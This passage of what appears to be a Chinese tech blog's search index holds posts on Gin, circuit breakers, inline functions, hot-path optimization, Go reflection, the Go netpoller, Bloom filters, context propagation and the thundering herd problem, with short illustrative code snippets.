默认提供常用中间件（如 Logger, Recovery）。 支持全局中间件和路由组级中间件。 5. 路由树（Radix Tree） 作用：基于 httprouter 的基数树路由实现，提供高效的路由匹配。 特点： 支持动态路由（如 /user/:id）和通配符（如 /file/*path）。 路由匹配速度快，适合高并发场景。 6. 数据绑定与验证 作用：简化请求数据的解析和校验。 关键工具： Binding：将请求体（JSON/XML/Form）自动绑定到结构体（ShouldBind 系列方法）。 Validation：通过 validator 库对绑定数据进行校验（如字段格式、必填项）。 7. 渲染引擎（Render） 作用：统一响应内容的格式处理。 支持类型： JSON、XML、ProtoBuf 等结构化数据。 HTML 模板渲染（可集成第三方模板引擎如 Go Template）。 核心协作流程 初始化引擎：engine := gin.Default() 注册中间件：engine.Use(middleware1, middleware2) 定义路由：engine.GET(\u0026quot;/path\u0026quot;, handler) 处理请求： 请求到达后，按顺序执行匹配的中间件。 路由匹配成功后，调用对应的处理函数（Handler）。 通过 Context 处理请求和生成响应。 总结 Gin 的核心设计围绕高性能和简洁性展开，通过 Engine 协调路由、中间件和上下文，结合高效的路由树和灵活的中间件机制，使其成为 Go 生态中最受欢迎的 Web 框架之一。\n","link":"https://www.qiankun.info/posts/gin-%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6/","section":"posts","tags":["go","gin"],"title":"Gin 核心组件"},{"body":"","link":"https://www.qiankun.info/tags/%E5%AE%B9%E9%94%99/","section":"tags","tags":null,"title":"容错"},{"body":"分布式系统中的服务熔断是一种容错保护机制，其核心目标是通过**快速失败（Fail Fast）**防止服务间的级联故障，避免系统雪崩。它的设计灵感来源于电路中的熔断器：当电路过载时，熔断器自动断开，保护整个系统。\n核心作用 故障隔离\n当某个下游服务响应超时或异常率过高时，熔断器会立即切断对该服务的调用，避免资源（如线程、连接）被长期占用。\n快速失败\n熔断后，请求直接返回预设的降级结果（如错误提示、缓存数据），减少无意义的等待和资源消耗。\n自动恢复\n熔断器会周期性检测下游服务是否恢复（如每隔30秒），逐步尝试恢复调用，避免人工干预。\n防止雪崩\n通过阻断对故障服务的持续调用，避免局部故障扩散到整个系统。\n工作原理（状态机模型） 熔断器通常包含三种状态，通过阈值和策略自动切换：\nClosed（关闭）\n默认状态，允许正常调用。 触发熔断：当失败率（如超时、异常）超过阈值（如50%），或连续失败次数达到阈值，进入Open状态。 Open（开启）\n拒绝所有请求，直接返回降级结果。 进入半开：经过预设的休眠时间（如5秒），进入Half-Open状态，试探性恢复少量请求。 Half-Open（半开）\n允许少量请求通过，用于探测下游服务是否恢复。 恢复成功：如果试探请求成功率达到阈值（如80%），回到Closed状态。 恢复失败：如果仍失败，回到Open状态，延长熔断时间。 典型应用场景 依赖服务不可用\n例如，支付服务宕机时，电商订单服务通过熔断直接返回“支付繁忙”提示，而非无限等待。\n高延迟导致资源耗尽\n若用户服务响应变慢，熔断器阻止前端持续调用，避免线程池被占满，影响其他功能。\n突发流量冲击\n在秒杀活动中，熔断器可保护核心服务不被过载的次要请求拖垮。\n实现工具 Netflix Hystrix：最早的熔断实现，提供线程隔离、熔断、降级等功能。 Resilience4j：轻量级熔断库，支持Java函数式编程。 Sentinel：阿里巴巴开源的流量控制组件，支持熔断、限流、降级。 Spring Cloud Circuit Breaker：抽象层，支持Hystrix、Resilience4j等多种实现。 配置参数示例 1# Resilience4j 配置示例 2resilience4j.circuitbreaker: 3 instances: 4 paymentService: 5 failureRateThreshold: 50% # 触发熔断的失败率阈值 6 minimumNumberOfCalls: 10 # 计算阈值的最小请求数 7 slidingWindowType: COUNT_BASED 8 slidingWindowSize: 20 # 统计最近20次请求的失败率 9 waitDurationInOpenState: 30s # Open状态持续时间 10 permittedNumberOfCallsInHalfOpenState: 5 # 半开状态允许的试探请求数 最佳实践 合理设置阈值：根据业务容忍度调整失败率和超时时间。 监控与告警：实时监控熔断状态，及时排查根本原因。 降级策略：熔断后返回缓存数据、默认值或队列化请求。 结合重试机制：在熔断前可对偶发错误进行有限次重试（但需注意幂等性）。 服务熔断是构建弹性分布式系统的关键机制，需与服务降级、限流、超时控制等配合使用，共同保障系统高可用。\n","link":"https://www.qiankun.info/posts/%E6%9C%8D%E5%8A%A1%E7%86%94%E6%96%AD/","section":"posts","tags":["架构","高可用","容错"],"title":"服务熔断"},{"body":"","link":"https://www.qiankun.info/tags/%E6%9E%B6%E6%9E%84/","section":"tags","tags":null,"title":"架构"},{"body":"","link":"https://www.qiankun.info/tags/%E9%AB%98%E5%8F%AF%E7%94%A8/","section":"tags","tags":null,"title":"高可用"},{"body":"内联函数（Inline Function）是编程中用于优化程序性能的一种机制，尤其在C++中常见。以下是关于内联函数的详细说明：\n1. 目的 内联函数的主要目的是减少函数调用带来的开销。普通函数调用时会产生压栈、跳转和返回等操作的开销，而内联函数通过将函数代码直接“嵌入”调用处来避免这些开销，从而提高运行效率。\n2. 工作原理 代码展开：编译器在调用内联函数的位置，直接替换为函数体的代码（类似宏展开），省去了函数调用的步骤。 编译期处理：是否内联由编译器决定。即使使用 inline 关键字，也只是对编译器的建议，最终是否内联取决于编译器优化策略。 3. 使用场景 短小简单的函数：适合内联的函数通常代码简短（如1-3行），例如简单的数学运算、getter/setter方法。 频繁调用的函数：被多次调用的函数内联后能显著减少开销。 4. 语法示例（C++） 1// 声明为内联函数 2inline int add(int a, int b) { 3 return a + b; 4} 5 6int main() { 7 int result = add(3, 4); // 编译时可能被替换为 int result = 3 + 4; 8 return 0; 9} 5. 优缺点 优点： 减少函数调用开销，提升性能。 保留函数的结构化特性（与宏相比更安全，支持类型检查）。 缺点： 代码膨胀：若函数体过大或调用次数过多，会导致可执行文件体积增大。 可能影响编译速度：代码重复展开会增加编译时间。 6. 注意事项 编译器自主权：inline 只是建议，编译器可能忽略。复杂函数（如递归、循环）通常无法内联。 头文件定义：内联函数通常定义在头文件中，以便编译器在所有调用点看到完整定义。 与宏的区别： 宏（#define）是预处理器文本替换，无类型检查，易出错。 内联函数是真正的函数，有类型安全，支持调试。 7. 对比普通函数调用 普通函数： 1int add(int a, int b) { return a + b; } 2// 调用时需压栈参数、跳转、返回，产生开销。 内联函数： 1inline int add(int a, int b) { return a + b; } 2// 调用处直接展开为 return 3 + 4;，无额外开销。 总结 内联函数是一种以空间换时间的优化手段，适合短小且频繁调用的函数。合理使用可提升性能，但需避免滥用导致代码膨胀。在实际开发中，现代编译器的优化能力已非常强大，应优先依赖编译器的自动内联策略。\n","link":"https://www.qiankun.info/posts/%E5%86%85%E8%81%94%E5%87%BD%E6%95%B0/","section":"posts","tags":["程序设计"],"title":"内联函数"},{"body":"","link":"https://www.qiankun.info/tags/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/","section":"tags","tags":null,"title":"程序设计"},{"body":"热路径（Hot Path）是代码中执行频率最高、耗时最长的关键路径，通常占用了程序运行时的绝大部分资源。优化热路径可以显著提升程序性能。以下是对热路径的详细解析：\n一、热路径的定义 热路径指在程序执行过程中：\n执行频率最高的代码段（如循环体、高频调用的函数） 耗时最长的代码段（如复杂计算、I/O操作） 资源消耗最大的代码段（如内存分配、锁竞争） 二、识别热路径的方法 1. 性能分析工具 CPU Profiler：通过采样或插桩统计函数调用耗时\n工具示例：Linux的 perf、gprof，Windows的 Visual Studio Profiler，Python的 cProfile 输出示例： 1Flat profile: 2% cumulative self self total 3time seconds seconds calls ms/call ms/call name 475.0 3.00 3.00 100000 0.03 0.03 hot_function 525.0 4.00 1.00 1 1000.00 4000.00 main 这里 hot_function 是热路径。 火焰图（Flame Graph）：可视化函数调用栈和耗时分布\n2. 代码特征 高频循环：如数据处理的 for/while 循环 递归调用：深度递归可能导致栈溢出或高耗时 系统调用：如频繁的 read()、write() 或网络请求 三、热路径优化策略 1. 算法优化 1# 优化前：O(n²) 复杂度 2def process_data(data): 3 for i in range(len(data)): 4 for j in range(len(data)): 5 # 复杂计算 6 7# 优化后：降低为 O(n) 8def process_data(data): 9 cache = precompute(data) 10 for item in data: 11 use_cache(item, cache) 2. 减少重复计算 1// 优化前：重复计算 pow(x, 2) 2for (int i = 0; i \u0026lt; n; i++) { 3 double y = pow(x, 2) * i; 4} 5 6// 优化后：预先计算结果 7double x_squared = pow(x, 2); 8for (int i = 0; i \u0026lt; n; i++) { 9 double y = x_squared * i; 10} 3. 内存访问优化 缓存友好：顺序访问数据，避免随机访问 数据对齐：利用 CPU 缓存行（Cache Line） 4. 并发与并行化 1// 优化前：单线程处理 2for (Item item : list) { 3 item.process(); 4} 5 6// 优化后：并行流（Java） 7list.parallelStream().forEach(Item::process); 5. 避免阻塞操作 异步I/O：使用非阻塞读写（如 epoll、asyncio） 减少锁竞争：用无锁数据结构或细粒度锁 四、注意事项 不要过早优化：先通过 Profiler 确认热路径 权衡可读性：避免过度优化导致代码难以维护 测试验证：优化后需验证功能正确性和性能提升 五、典型案例 案例：游戏循环中的热路径 1// 热路径：每帧执行的逻辑 2while (game_is_running) { 3 process_input(); // 高频调用 4 update_physics(); // 高耗时计算 5 render_graphics(); // GPU密集型操作 6} 优化方法：\n将 update_physics 分帧处理 使用多线程渲染（如 Vulkan/DirectX 12） 通过精准定位和优化热路径，程序的性能通常可提升 10 倍以上。建议结合具体场景选择优化策略。\n","link":"https://www.qiankun.info/posts/%E7%83%AD%E8%B7%AF%E5%BE%84%E4%BC%98%E5%8C%96/","section":"posts","tags":["程序设计"],"title":"热路径优化"},{"body":"Go语言的反射（reflect 包）提供了在运行时动态操作类型和值的能力，但它是一把双刃剑，既有强大的灵活性，也存在明显的局限性。以下是其优缺点分析：\n优点 动态类型操作\n反射允许程序在运行时动态检查变量类型、结构体字段、方法等，适用于处理未知类型的数据。\n应用场景：JSON/XML解析、ORM映射、配置文件加载等需要根据类型动态赋值的场景。 实现泛型逻辑\n在Go缺乏泛型的旧版本中，反射被广泛用于编写通用函数（如容器操作、数据转换）。\n示例：标准库的encoding/json通过反射解析和生成JSON数据。 动态调用方法\n可以通过反射动态调用结构体的方法，实现插件化或依赖注入。\n示例：Web框架中根据路由动态调用控制器方法。 灵活处理结构体\n反射可以遍历结构体字段、读取标签（Tag），用于生成文档、验证数据或生成SQL语句。\n示例：结构体字段的json:\u0026quot;name\u0026quot;标签被反射解析以生成JSON键名。 缺点 性能开销\n反射操作比直接代码慢1~2个数量级，频繁使用会导致性能瓶颈。\n测试结果：直接赋值耗时约1ns，反射赋值可能需要100ns以上。 代码可读性差\n反射代码通常冗长且抽象，逻辑难以理解，增加维护成本。\n示例：通过reflect.Value.Call()调用方法时，需要手动构造参数列表。 类型安全缺失\n反射绕过了编译时的类型检查，错误（如字段不存在、类型不匹配）只能在运行时触发panic。\n风险：v.SetInt(42)若v不是int类型，会导致崩溃。 无法处理未导出字段\n反射默认无法修改结构体的未导出字段（小写字母开头的字段），除非借助unsafe包，但这会破坏封装性。\n限制：无法通过反射直接修改其他包中未公开的结构体字段。 调试困难\n反射相关的错误（如panic: reflect: call of non-function）通常难以定位，尤其是在复杂逻辑中。\n适用场景 vs 不适用场景 场景 是否适用反射 说明 处理多种未知类型 ✅ 适用 如解析JSON到任意结构体 高性能关键路径代码 ❌ 不适用 反射的性能开销可能成为瓶颈 动态调用插件或扩展 ✅ 适用 通过反射加载并调用动态代码 需要高可读性的代码 ❌ 不适用 反射代码通常难以维护 操作未导出字段或私有逻辑 ❌ 不适用 需依赖unsafe包，且违反封装原则 替代方案 接口和类型断言\n优先使用接口（interface{}）和类型断言（x.(T)）处理多态逻辑，更安全且性能更好。\n1if s, ok := val.(string); ok { 2 // 直接操作s 3} 代码生成工具\n使用go generate生成类型专用代码，避免运行时反射（如protobuf、gorm的代码生成）。\n泛型（Go 1.18+）\nGo 1.18引入泛型后，许多反射场景可用泛型替代，如通用容器或工具函数：\n1func PrintSlice[T any](s []T) { 2 for _, v := range s { 3 fmt.Println(v) 4 } 5} 总结 反射的核心理念：\n“反射是元编程的一种手段，但应作为最后的选择。”\n能用静态代码解决的问题，不要用反射。 必须用时，严格限制范围（如仅在初始化阶段使用）。 建议：\n在框架、库开发或需要高度灵活性的场景中合理使用反射。 在业务代码中尽量避免反射，优先使用接口、泛型或代码生成。 ","link":"https://www.qiankun.info/posts/go%E5%8F%8D%E5%B0%84%E4%BC%98%E7%BC%BA%E7%82%B9/","section":"posts","tags":["go"],"title":"Go反射优缺点"},{"body":"Go语言的反射（Reflection）机制允许程序在运行时动态地操作变量、结构体、函数等，获取其类型信息或修改其值。反射的核心是 reflect 包，通过它可以在运行时检查类型、调用方法、修改变量值等。以下是反射的详细用法和示例：\n一、反射基础 反射的核心类型是 reflect.Type 和 reflect.Value：\nreflect.Type：表示Go语言的具体类型（如 int, string, 自定义结构体等）。 reflect.Value：存储任意类型的值，并提供操作值的方法。 1.1 获取类型和值 1package main 2 3import ( 4 \u0026#34;fmt\u0026#34; 5 \u0026#34;reflect\u0026#34; 6) 7 8func main() { 9 var x float64 = 3.14 10 11 // 获取类型信息 12 t := reflect.TypeOf(x) 13 fmt.Println(\u0026#34;Type:\u0026#34;, t) // 输出: float64 14 15 // 获取值信息 16 v := reflect.ValueOf(x) 17 fmt.Println(\u0026#34;Value:\u0026#34;, v) // 输出: 3.14 18} 1.2 类型种类（Kind） reflect.Kind 表示基础类型（如 int, struct, slice 等）：\n1func checkKind(x interface{}) { 2 v := reflect.ValueOf(x) 3 fmt.Println(\u0026#34;Kind:\u0026#34;, v.Kind()) // 输出基础类型 4} 5 6checkKind(42) // int 7checkKind(\u0026#34;hello\u0026#34;) // string 8checkKind(struct{}{})// struct 二、操作 reflect.Value 2.1 获取实际值 通过 Value 的方法获取具体类型的值：\n1v := reflect.ValueOf(42) 2if v.Kind() == reflect.Int { 3 fmt.Println(v.Int()) // 输出: 42 4} 2.2 修改变量值 需确保值是可设置的（CanSet()）：\n1func modifyValue() { 2 var x float64 = 3.14 3 4 // 通过指针获取可设置的 Value 5 v := reflect.ValueOf(\u0026amp;x).Elem() // Elem() 获取指针指向的值 6 if v.CanSet() { 7 v.SetFloat(6.28) 8 } 9 fmt.Println(x) // 输出: 6.28 10} 三、处理结构体 3.1 遍历结构体字段 1type User struct { 2 Name string `json:\u0026#34;name\u0026#34;` 3 Age int `json:\u0026#34;age\u0026#34;` 4} 5 6func inspectStruct(u interface{}) { 7 t := reflect.TypeOf(u).Elem() // 获取指针指向的类型 8 v := reflect.ValueOf(u).Elem() 9 10 for i := 0; i \u0026lt; t.NumField(); i++ { 11 field := t.Field(i) 12 value := v.Field(i) 13 fmt.Printf(\u0026#34;%s: %v (tag: %s)\\n\u0026#34;, field.Name, value, field.Tag.Get(\u0026#34;json\u0026#34;)) 14 } 15} 16 17user := User{Name: \u0026#34;Alice\u0026#34;, Age: 30} 18inspectStruct(\u0026amp;user) 19// 输出: 20// Name: Alice (tag: name) 21// Age: 30 (tag: age) 3.2 动态调用结构体方法 1type Calculator struct{} 2 3func (c *Calculator) Add(a, b int) int { 4 return a + b 5} 6 7func callMethod() { 8 calc := \u0026amp;Calculator{} 9 method := reflect.ValueOf(calc).MethodByName(\u0026#34;Add\u0026#34;) 10 args := []reflect.Value{reflect.ValueOf(3), reflect.ValueOf(4)} 11 result := method.Call(args) 12 fmt.Println(result[0].Int()) // 输出: 7 13} 四、创建实例 4.1 通过类型创建新实例 1func createInstance(t reflect.Type) interface{} { 2 return reflect.New(t).Interface() 3} 4 5var userType = reflect.TypeOf(User{}) 6newUser := createInstance(userType).(*User) 7newUser.Name = \u0026#34;Bob\u0026#34; 8fmt.Println(newUser) // 输出: \u0026amp;{Bob 0} 五、反射的注意事项 性能问题：反射操作比直接代码慢，避免在性能敏感的代码中使用。 类型安全：反射绕过了编译时类型检查，可能导致运行时错误（如 panic）。 代码可读性：反射代码通常更复杂，难以维护。 六、常见应用场景 序列化/反序列化（如JSON、XML解析）。 ORM框架：动态操作结构体字段和数据库表映射。 依赖注入：根据类型动态创建实例。 插件系统：动态加载并调用函数。 七、完整示例 1package main 2 3import ( 4 \u0026#34;fmt\u0026#34; 5 \u0026#34;reflect\u0026#34; 6) 7 8type Person struct { 9 Name string `json:\u0026#34;name\u0026#34;` 10 Age int `json:\u0026#34;age\u0026#34;` 11} 12 13func main() { 14 p := Person{Name: \u0026#34;Charlie\u0026#34;, Age: 25} 15 16 // 获取类型和值 17 t := reflect.TypeOf(p) 18 v := reflect.ValueOf(p) 19 20 // 遍历结构体字段 21 for i := 0; i \u0026lt; t.NumField(); i++ { 22 field := t.Field(i) 23 value := v.Field(i) 24 fmt.Printf(\u0026#34;%s (%s): %v\\n\u0026#34;, field.Name, field.Type, value) 25 } 26 27 // 修改字段值（需传递指针） 28 pv := reflect.ValueOf(\u0026amp;p).Elem() 29 pv.FieldByName(\u0026#34;Age\u0026#34;).SetInt(26) 30 fmt.Println(p) // 输出: {Charlie 26} 31} 八、总结 反射是Go语言中强大的工具，但应谨慎使用。优先考虑接口和类型断言等更安全的机制，仅在必要时（如处理未知类型或动态操作）使用反射。理解 reflect.Type 和 reflect.Value 的核心方法，结合具体场景灵活运用。\n","link":"https://www.qiankun.info/posts/go%E5%8F%8D%E5%B0%84%E7%94%A8%E6%B3%95/","section":"posts","tags":["go"],"title":"Go反射用法"},{"body":"Go运行时中的网络轮询器（Netpoller）是Go语言实现高并发I/O的核心组件，其职责和工作方式可以概括如下：\n一、网络轮询器的职责 I/O事件监控\n负责监控所有网络套接字（文件描述符）的I/O事件（如可读、可写、错误等），并基于操作系统提供的I/O多路复用机制（如epoll、kqueue、IOCP）实现高效的事件驱动。\nGoroutine调度协调\n当Goroutine执行阻塞式I/O操作（如conn.Read或conn.Write）时，网络轮询器会将该Goroutine挂起（阻塞），并让出CPU资源给其他Goroutine。 当I/O事件就绪时，轮询器通知Go运行时调度器，唤醒对应的Goroutine继续执行，实现异步非阻塞的I/O操作。 资源高效利用\n避免因阻塞调用导致系统线程（M）被占用，仅需少量系统线程即可处理成千上万的并发连接，支撑Go的“轻量级线程”模型。\n二、网络轮询器的工作方式 1. 平台适配与初始化 多路复用机制选择：\nGo运行时根据操作系统选择底层实现： Linux：epoll BSD（macOS/Darwin）：kqueue Windows：IOCP（I/O完成端口） 其他：降级为基于线程的轮询（如poll）。 初始化：程序启动时，运行时调用netpollinit创建全局网络轮询器实例（如epoll实例）。 2. 事件注册与监听 注册文件描述符：\n当Goroutine发起I/O操作（如读取socket）时，若数据未就绪，Go运行时通过netpollopen将文件描述符（fd）注册到轮询器，并关联到当前Goroutine。 监听事件循环：\n轮询器在一个或多个后台系统线程中运行事件循环（如epoll_wait），持续监听所有注册的fd的I/O事件。 3. 事件就绪与Goroutine唤醒 事件触发：当某个fd的I/O事件就绪（如socket收到数据），轮询器将其标记为就绪状态。 调度通知：轮询器通过netpoll函数获取所有就绪的事件，将对应的Goroutine从等待队列移出，并通过goready将其标记为可运行状态。 调度执行：Go调度器将唤醒的Goroutine分配到一个空闲的M（系统线程）或P（逻辑处理器）上继续执行。 4. 与调度器整合 非阻塞协作：\nGoroutine在等待I/O时被挂起（gopark），其状态从Grunning变为Gwaiting，释放占用的M，使得M可以执行其他Goroutine。 无缝切换：\n事件就绪后，轮询器与调度器协同工作，将Goroutine状态恢复为Grunnable，并加入调度队列等待执行，实现无感知的异步I/O。 三、性能优化策略 边缘触发（Edge-Triggered）优化\n使用边缘触发模式（如Linux的epoll默认是水平触发，但Go通过一次性处理所有就绪事件模拟边缘触发），避免重复通知，减少系统调用次数。\n多线程轮询（Linux为例）\n在Linux中，Go 1.18+引入多线程轮询，允许多个系统线程同时调用epoll_wait，提高高并发场景下的吞吐量。\n与GMP模型深度集成\n每个逻辑处理器（P）关联一个本地就绪队列，减少锁竞争，确保唤醒的Goroutine能快速被调度。\n四、示例流程 Goroutine发起conn.Read读取socket数据。 若内核缓冲区无数据，运行时调用gopark挂起Goroutine，并将socket fd注册到epoll。 epoll线程通过epoll_wait监听到socket数据到达，通知Go运行时。 运行时将Goroutine标记为就绪，加入调度队列。 调度器分配M执行该Goroutine，继续处理数据。 总结 网络轮询器是Go高并发的基石，通过操作系统原生I/O多路复用与Go调度器的深度协作，将同步I/O操作转化为异步事件驱动，使Goroutine能够高效处理海量连接，同时保持代码的简洁性（用户无需感知回调或Promise）。\n","link":"https://www.qiankun.info/posts/go%E8%BF%90%E8%A1%8C%E6%97%B6%E4%B8%AD%E7%BD%91%E7%BB%9C%E8%BD%AE%E8%AF%A2%E5%99%A8%E7%9A%84%E8%81%8C%E8%B4%A3%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F/","section":"posts","tags":["go"],"title":"网络轮询器的职责和工作方式"},{"body":"布隆过滤器（Bloom Filter）是一种空间高效的概率型数据结构，用于快速判断一个元素是否可能存在于集合中。其核心工作原理基于哈希函数和位数组的配合，通过牺牲一定的准确性（允许假阳性）来换取极低的空间占用和极高的查询速度。以下是其工作原理的详细分解：\n1. 核心组件 位数组（Bit Array）：\n一个长度为 m 的二进制数组，初始时所有位均为 0。 哈希函数（Hash Functions）：\n使用 k 个独立且均匀分布的哈希函数（如 MurmurHash、FNV 等），每个函数将输入元素映射到位数组的某个位置。 2. 添加元素（插入） 哈希映射：\n将待插入元素依次通过 k 个哈希函数，得到 k 个不同的位置索引：\n[ h_1(e), h_2(e), \\dots, h_k(e) \\quad (每个值在 [0, m-1] 范围内) ] 置位操作：\n将位数组中这 k 个位置的值全部设置为 1。\n示例：\n插入元素 \u0026quot;apple\u0026quot;，假设哈希结果为位置 3, 7, 10，则这些位置会被置为 1。 3. 查询元素（存在性检查） 哈希映射：\n对待查询元素同样使用 k 个哈希函数，得到 k 个位置索引。 检查位值： 如果所有 k 个位置的值均为 1 → 返回 “可能存在”（存在假阳性）。 如果任一位置为 0 → 返回 “肯定不存在”（无假阴性）。\n示例：\n查询元素 \u0026quot;banana\u0026quot;，若其哈希位置为 3, 5, 10，且位置 5 为 0，则判定为不存在。 4. 关键特性 假阳性（False Positive）：\n不同元素的哈希位置可能重叠。例如，未插入的元素 \u0026quot;orange\u0026quot; 的哈希位置可能被其他元素覆盖，导致误判为存在。\n数学原因：\n误判率由公式 ( P \\approx \\left(1 - e^{-k n / m}\\right)^k ) 决定，其中 n 为已插入元素数量。\n无假阴性（False Negative）：\n若元素已被插入，其哈希位置一定为 1，因此查询时不可能漏判。\n不支持删除：\n直接删除元素（将某些位置置 0）可能影响其他元素的哈希结果。\n解决方法：使用变种如计数布隆过滤器（用计数器代替二进制位）。\n5. 参数设计（平衡空间与准确性） 位数组大小 m：\nm 越大，冲突概率越低，但占用内存越多。\n公式：( m = -\\frac{n \\ln p}{(\\ln 2)^2} )，其中 p 是目标误判率，n 是预期元素数量。\n哈希函数数量 k：\n最优值：( k = \\frac{m}{n} \\ln 2 )。\n实践中，k 通常取 3-10，过多会增加计算开销，过少会提高冲突概率。\n6. 工作原理示意图 1位数组初始状态： [0, 0, 0, 0, 0, 0, 0, 0] 2 3插入元素 \u0026#34;apple\u0026#34;（哈希位置 3,7,10）： 4[0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1] 5 6查询 \u0026#34;apple\u0026#34; → 所有位置为1 → \u0026#34;可能存在\u0026#34; 7查询 \u0026#34;banana\u0026#34;（哈希位置3,5,10）→ 位置5为0 → \u0026#34;肯定不存在\u0026#34; 8查询 \u0026#34;orange\u0026#34;（哈希位置1,3,7）→ 所有位置为1（误判）→ \u0026#34;可能存在\u0026#34; 7. 典型应用场景 缓存穿透防护：\n快速过滤无效请求（如不存在的缓存键），避免直接查询数据库。 网络爬虫去重：\n记录已爬取的 URL，防止重复抓取。 分布式系统：\n在多个节点间同步数据状态，减少网络传输。 垃圾邮件过滤：\n快速判断邮件地址是否在黑名单中。 8. 优缺点总结 优点 缺点 空间效率极高（远低于哈希表） 存在假阳性（无法完全准确） 查询时间恒定（O(k)，与数据量无关） 不支持删除操作（需变种实现） 可分布式实现 需要预先估计数据规模 n 9. 代码示例（Python简化版） 1import hashlib 2from bitarray import bitarray 3 4class BloomFilter: 5 def __init__(self, m, k): 6 self.m = m 7 self.k = k 8 self.bits = bitarray(m) 9 self.bits.setall(0) 10 11 def _hash(self, item, seed): 12 # 使用带种子的哈希函数生成位置 13 hash_val = int(hashlib.sha256(f\u0026#34;{item}_{seed}\u0026#34;.encode()).hexdigest(), 16) 14 return hash_val % self.m 15 16 def add(self, item): 17 for i in range(self.k): 18 index = self._hash(item, i) 19 self.bits[index] = 1 20 21 def contains(self, item): 22 for i in range(self.k): 23 index = self._hash(item, i) 24 if self.bits[index] == 0: 25 return False 26 return True 总结 布隆过滤器通过哈希函数将元素映射到位数组上，以概率方式实现高效的存在性检查。其核心价值在于以极小的空间和恒定时间完成大规模数据的快速过滤，适用于容忍假阳性但对空间和速度敏感的场景。使用时需根据业务需求合理选择参数 m 和 k，权衡误判率与资源开销。\n","link":"https://www.qiankun.info/posts/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%8E%9F%E7%90%86/","section":"posts","tags":["程序设计"],"title":"布隆过滤器的原理"},{"body":"在 Go 开发的分布式系统中，context.Context 的跨服务传递是实现链路跟踪、超时控制、元数据共享等分布式功能的核心机制。以下是其工作原理和实现方式的详细说明：\n1. 核心机制：协议头传递 跨服务传递 context 的本质是通过 网络协议的头部字段（Headers/Metadata） 序列化和反序列化上下文数据。常见方式包括：\nHTTP 请求头：如 X-Request-Id 传递请求 ID。 gRPC Metadata：类似键值对的元数据。 消息队列属性：如 Kafka Headers、RabbitMQ 消息属性。 2. 具体实现步骤 发送方：注入数据到协议头 将 context 中的数据提取并写入请求的协议头中。\n1// 示例：在 HTTP 客户端注入 context 数据 2func SendRequest(ctx context.Context, url string) { 3 req, _ := http.NewRequest(\u0026#34;GET\u0026#34;, url, nil) 4 // 从 ctx 提取数据并写入 Header 5 req.Header.Add(\u0026#34;X-Trace-ID\u0026#34;, ctx.Value(\u0026#34;trace_id\u0026#34;).(string)) 6 req.Header.Add(\u0026#34;X-Timeout\u0026#34;, getTimeoutFromCtx(ctx)) 7 http.DefaultClient.Do(req) 8} 接收方：从协议头重建 Context 从接收到的请求头中提取数据，构建新的 context。\n1// 示例：在 HTTP 服务端解析 Header 到 context 2func Handler(w http.ResponseWriter, r *http.Request) { 3 traceID := r.Header.Get(\u0026#34;X-Trace-ID\u0026#34;) 4 ctx := context.WithValue(r.Context(), \u0026#34;trace_id\u0026#34;, traceID) 5 // 使用新的 ctx 处理业务 6 processRequest(ctx) 7} 3. gRPC 的 Metadata 传递 gRPC 内置了 metadata 机制，通过 metadata.FromIncomingContext 和 metadata.NewOutgoingContext 处理上下文。\n客户端发送 metadata：\n1// 创建带有 metadata 的 context 2md := metadata.Pairs(\u0026#34;trace_id\u0026#34;, \u0026#34;12345\u0026#34;) 3ctx := metadata.NewOutgoingContext(context.Background(), md) 4// 发起 RPC 调用 5response, err := client.SomeMethod(ctx, request) 服务端接收 metadata：\n1func (s *Server) SomeMethod(ctx context.Context, req *pb.Request) (*pb.Response, error) { 2 md, _ := metadata.FromIncomingContext(ctx) 3 traceID := md.Get(\u0026#34;trace_id\u0026#34;)[0] 4 // 使用 traceID 处理逻辑 5} 4. 超时与取消的传播 计算剩余超时时间：在发起跨服务调用前，计算父 context 的剩余超时时间，并通过类似 X-Timeout-Ms 的 Header 传递。 设置下游超时：接收方解析超时时间，使用 context.WithTimeout 创建新的上下文。 1// 客户端设置超时 Header 2deadline, ok := ctx.Deadline() 3if ok { 4 timeoutMs := time.Until(deadline).Milliseconds() 5 req.Header.Add(\u0026#34;X-Timeout-Ms\u0026#34;, strconv.FormatInt(timeoutMs, 10)) 6} 5. 分布式追踪的集成 工具如 OpenTelemetry 会自动注入 context 到协议头，实现全链路追踪：\n1// 使用 OpenTelemetry 的传播器自动处理 2propagator := propagation.TraceContext{} 3carrier := propagation.HeaderCarrier(req.Header) 4propagator.Inject(ctx, carrier) 6. 注意事项 数据兼容性：确保所有服务约定相同的 Header 名称和数据类型（如字符串）。 安全性：敏感数据（如认证令牌）需加密或通过安全通道传输。 性能：避免传递过大的数据，防止头部膨胀。 总结 通过将 context 的数据编码到网络协议的头部字段，Go 的分布式系统实现了跨服务的上下文传递。结合标准库（如 metadata）和开源工具（如 OpenTelemetry），开发者可以高效构建支持链路跟踪、超时控制等关键功能的分布式应用。\n","link":"https://www.qiankun.info/posts/context-%E8%B7%A8%E6%9C%8D%E5%8A%A1%E4%BC%A0%E9%80%92/","section":"posts","tags":["go"],"title":"Context 跨服务传递"},{"body":"惊群效应（Thundering Herd Problem） 是计算机科学中的一个术语，通常指在多进程、多线程或分布式系统中，多个任务（如进程、线程）因同时竞争同一资源或等待同一事件而被唤醒，但最终只有一个任务能成功处理事件，其余任务被无效唤醒并重新进入等待状态的现象。这种“无效唤醒”会导致系统资源浪费和性能下降。\n核心原因 当一个共享资源（如网络连接、锁、文件描述符等）变为可用时，系统可能同时唤醒所有等待该资源的任务，导致它们同时竞争，但最终只有少数（甚至一个）能成功获取资源，其他任务被迫重新进入等待状态。\n典型场景 多进程/线程监听同一端口\n例如：多个进程通过 accept() 监听同一个网络端口。当新连接到达时，所有进程都会被唤醒，但只有一个能成功处理连接，其他进程因竞争失败而重新挂起。\n文件描述符事件通知\n使用 select、poll 或 epoll 监听文件描述符时，若多个线程/进程等待同一事件（如可读/可写），事件触发时所有监听者都会被唤醒。\n锁竞争\n多个线程等待同一锁，锁释放时所有线程被唤醒并竞争，但只有第一个能获取锁，其他线程重新等待。\n负面影响 资源浪费：大量任务被唤醒后无意义地消耗 CPU 和内存。 性能下降：频繁的上下文切换（context switching）和锁竞争导致延迟增加。 可扩展性问题：系统在高并发时可能因惊群效应导致吞吐量骤降。 解决方案 单监听者模式\n仅允许一个进程/线程监听资源（如使用 